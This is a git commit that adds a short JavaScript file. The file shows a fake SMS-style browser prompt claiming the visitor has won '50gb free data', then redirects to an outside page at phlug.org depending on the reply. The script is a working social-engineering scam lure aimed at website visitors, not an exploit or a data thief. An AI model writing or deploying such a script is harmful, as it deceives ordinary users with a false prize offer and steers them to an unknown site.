f67fa42e6cdadb21de57a57d7ce329fb23b4e066
itidnewblog4 <ukpehaitid2@gmail.com>
2025-09-22 23:17:52 +0100

    Create heritage-active.js

---
+++ heritage-active.js
@@ -0,0 +1,5 @@
+var password = 'Activate 50GB'
+password=prompt('SMS: Congratulations, your mobile number is eligible to receive 50gb free data, click OK to activate now','Activate 50GB');
+if (password != 'Activate 50GB') {
+location.href='https://phlug.org/heritage.html';
+}
